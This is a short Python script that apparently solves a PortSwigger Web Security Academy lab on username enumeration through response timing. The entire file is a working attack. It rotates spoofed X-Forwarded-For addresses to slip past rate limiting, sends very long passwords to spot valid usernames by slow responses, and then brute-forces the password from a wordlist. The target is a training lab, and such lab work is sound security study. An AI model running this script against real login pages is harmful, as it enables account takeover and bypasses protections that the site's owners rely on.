# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing


import requests


with open('usernames.txt', 'r') as f:
    usernames = f.read().splitlines()

with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()


url = 'https://....web-security-academy.net/login'
found_username = ''
found_password = ''


ip_last = 1

for username in usernames:

    headers = {
        'X-Forwarded-For': f'42.0.0.{ip_last}'
    }
    body = {
        'username': username,
        'password': 'a' * 1000
    }

    r = requests.post(url=url, headers=headers, data=body)

    if 'too many incorrect' in r.text:
        raise Exception('Rate limited')
    
    if r.elapsed.total_seconds() > 3:
        found_username = username
        break

    ip_last += 1

print('Username: ', found_username)


ip_last = 1

for password in passwords:

    headers = {
        'X-Forwarded-For': f'64.0.0.{ip_last}'
    }
    login_body = {
        'username': found_username,
        'password': password
    }

    r = requests.post(url=url, headers=headers, data=login_body)

    if 'too many incorrect' in r.text:
        raise Exception('Rate limited')

    if 'Invalid' not in r.text:
        found_password = password
        break
    
    ip_last += 1

print('Password: ', found_password)
